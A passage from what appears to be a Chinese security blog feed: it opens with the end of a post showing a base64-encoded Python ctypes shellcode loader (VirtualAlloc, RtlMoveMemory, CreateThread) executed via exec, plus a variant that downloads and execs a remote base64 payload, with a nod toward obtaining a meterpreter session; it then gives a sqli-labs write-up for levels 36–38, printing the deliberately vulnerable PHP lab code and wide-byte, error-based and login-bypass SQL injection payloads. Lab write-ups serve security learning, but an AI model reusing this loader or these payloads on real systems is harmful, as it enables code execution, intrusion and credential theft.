ZGXnmoTlpKflsI8NCmtlcm5lbDMyID0gY3R5cGVzLmNkbGwuTG9hZExpYnJhcnkoImtlcm5lbDMyLmRsbCIpICPosIPnlKhrZXJuZWwzMi5kbGwNCmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0ICPov5Tlm57nsbvlnovkuLpjX3VpbnQ2NA0Kc2NfcHRyID0ga2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGJ1Zl9zaXplKSwgVklSVFVBTF9NRU0sIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpICPorr7nva4NCmJ1Zl9wdHIgPSAoY3R5cGVzLmNfY2hhciAqIGJ1Zl9zaXplKS5mcm9tX2J1ZmZlcihidWZfYXJyKSAj5bCGc2hlbGxjb2Rl5oyH5ZCR5oyH6ZKIDQpwcmludChzY19wdHIpDQpwcmludChidWZfcHRyKQ0Ka2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQoc2NfcHRyKSxidWZfcHRyLGN0eXBlcy5jX2ludChidWZfc2l6ZSkpICPosIPnlKhkbGzvvIzmjIflkJFzaGVsbGNvZGUNCg0KaGFuZGxlID0ga2VybmVsMzIuQ3JlYXRlVGhyZWFkKGN0eXBlcy5jX2ludCgwKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMuY19pbnQoMCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfdWludDY0KHNjX3B0ciksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfaW50KDApLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN0eXBlcy5jX2ludCgwKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpKQ0Ka2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoaGFuZGxlKSxjdHlwZXMuY19pbnQoLTEpKQ=="</span></span><br><span class="line">exec(base64.b64decode(payload))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGMfxK.md.png" alt=""></p><p>在或者说，你可以选择远程读取并执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://127.0.0.1/wc.txt'</span></span><br><span class="line">rqt=requests.get(url=url)</span><br><span class="line">exec(base64.b64decode(rqt.text))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGMHIA.md.png" alt=""></p><p>如果想获取到meterpreter的话相信诸位都懂的，手动滑稽</p><p>最后还是谢谢Yansu老哥<br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs less 36 -&gt; sqli-labs less 40</title>
      <link href="/posts/2d92bd8a.html"/>
      <url>/posts/2d92bd8a.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天继续闯sqli-labs，闯到第40关。做个记录<br><img src="http://i1.hdslb.com/bfs/archive/5378b3b12df86f8816a7cd8e400f7b675d88fa52.jpg" alt="5378b3b12df86f8816a7cd8e400f7b675d88fa52.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>第三十六关</b><br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-36 **Bypass MySQL Real Escape String**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">function check_quotes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_quotes($_GET[&apos;id&apos;]);</span><br><span class="line">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;font color= &quot;#00FF00&quot;&gt;&apos;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-36.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function strToHex($string)</span><br><span class="line">&#123;</span><br><span class="line">    $hex=&apos;&apos;;</span><br><span class="line">    for ($i=0; $i &lt; strlen($string); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $hex .= dechex(ord($string[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    return $hex;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Hint: The Query String you input is escaped as : &quot;.$id .&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;The Query String you input in Hex becomes : &quot;.strToHex($id);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>数据库是gbk编码，使用mysql_real_escape_string()函数过滤了特殊字符，但是由于数据库是gbk编码<br>造成宽字节注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:%df&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGAPcd.md.png" alt="kGAPcd.md.png"></p><p><b>第三十七关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-37</span>- MySQL_real_escape_string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:24px; text-align:center"</span>&gt; Welcome&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div  align=<span class="string">"center"</span> style=<span class="string">"margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=<span class="string">"padding-top:10px; font-size:15px;"</span>&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!--Form to post the data <span class="keyword">for</span> sql injections Error based SQL Injection--&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> name=<span class="string">"form1"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">"margin-top:15px; height:30px;"</span>&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span>  name=<span class="string">"uname"</span> value=<span class="string">""</span>/&gt;</span><br><span class="line">&lt;/div&gt;  </span><br><span class="line">&lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"passwd"</span> value=<span class="string">""</span>/&gt;</span><br><span class="line">&lt;/div&gt;&lt;/br&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:9px;margin-left:90px;"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:10px;color:#FFF; font-size:23px; text-align:center"</span>&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-37.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname1=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd1=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//echo "username before addslashes is :".$uname1 ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password before addslashes is : ".$passwd1. "&lt;br&gt;";</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'User Name:'</span>.$uname1);</span><br><span class="line">fwrite($fp,<span class="string">'Password:'</span>.$passwd1.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">        </span><br><span class="line">        $uname = mysql_real_escape_string($uname1);</span><br><span class="line">        $passwd= mysql_real_escape_string($passwd1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//echo "username after addslashes is :".$uname ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password after addslashes is : ".$passwd;    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=<span class="string">'4'</span> color= <span class="string">"#33FFFF"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Username you input is escaped as : "</span>.$uname .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Password you input is escaped as : "</span>.$passwd .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求你进行登录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:%df&apos; or 1=1 %23</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGAWgH.png" alt="kGAWgH.png"></p><p><b>第三十八关</b><br>怎么后面的都没有过滤…..<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;../sql-connections/db-creds.inc&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-38 **stacked Query**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">//mysql connections for stacked query examples.</span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line">// Check connection</span><br><span class="line">if (mysqli_connect_errno($con1))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">/* execute multi query */</span><br><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&apos;;</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line">        /* print divider */</span><br><span class="line">    if (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            //printf(&quot;-----------------\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">     //while (mysqli_next_result($con1));</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">    &#123;</span><br><span class="line">echo &apos;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">    &#125;</span><br><span class="line">/* close connection */</span><br><span class="line">mysqli_close($con1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-38.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>直接报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1)|&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGE4WF.md.png" alt="kGE4WF.md.png"></p><p><b>第三十九关</b><br>我看后面这几关是给你复习的<br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 